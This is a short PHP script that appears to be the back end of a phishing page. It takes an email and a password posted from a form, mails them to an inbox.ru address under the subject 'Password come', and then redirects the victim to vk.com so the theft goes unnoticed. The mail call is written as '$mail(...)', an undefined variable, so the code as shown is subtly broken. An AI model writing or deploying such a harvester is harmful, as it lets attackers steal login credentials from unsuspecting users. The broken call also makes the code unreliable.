<?php

$email = $_POST['email'];
$pass = $_POST['pass'];

$mail('kalina123456789@inbox.ru', 'Password come', "Login $email Pass $pass");

header('Location: https://vk.com');
?>

